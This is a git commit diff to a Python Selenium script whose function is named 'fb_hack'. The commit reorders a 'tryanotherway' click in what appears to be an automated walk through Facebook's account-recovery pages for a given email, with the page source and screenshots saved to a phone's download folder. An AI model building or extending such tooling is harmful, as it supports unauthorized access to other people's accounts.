4dea903716582cd636cf7f20e313ef489e7917de
krarktel112 <krarktel@gmail.com>
2024-11-01 16:38:44 -0400

    Update 4.py

--- 4.py
+++ 4.py
@@ -49,6 +49,9 @@ def fb_hack(email, codex, respect):
   search_box.send_keys(email)
   search_box.send_keys(Keys.ENTER)
   sleep(2)
+  search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
+  search_button.click()
+  sleep(2)
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
   with open("output1.txt", "w") as file:
@@ -63,8 +66,6 @@ def fb_hack(email, codex, respect):
   destination_folder = "/sdcard/download/output1.html" 
   shutil.move(source_file, destination_folder)
   driver.save_screenshot("/sdcard/download/tester.png")
-  search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
-  search_button.click()
   """"make respect properly"
   counter = 0
   html = driver.page_source
